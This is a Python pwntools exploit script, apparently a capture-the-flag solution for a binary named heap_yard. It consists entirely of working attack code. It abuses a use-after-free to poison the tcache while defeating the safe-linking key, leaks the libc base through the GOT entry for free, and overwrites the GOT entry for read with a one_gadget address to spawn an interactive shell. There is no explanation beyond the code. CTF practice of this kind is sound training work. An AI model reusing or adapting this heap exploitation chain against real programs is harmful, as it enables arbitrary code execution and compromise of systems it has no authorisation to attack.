#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './heap_yard')
libc = ELF(exe.libc.path)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def malloc(idx):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())

def write(idx, data):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", data)

def delete(idx):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

def view(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    return u64(io.recvuntil(b"[1] -").split(b'[1] -')[0][0:8])

gdbscript = '''
b free
'''.format(**locals())

io = start()

malloc(0)
malloc(1)
delete(1)
delete(0)
write(0, p64((exe.symbols['ptr']) ^ view(1)))
malloc(2)
malloc(3)
write(3, p64(exe.got['free']))
libc.address = view(0) - libc.sym.free
write(3, p64(exe.got.read))
write(0, p64(libc.address + 0xef52b))

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b": ", str(0).encode())
io.interactive()

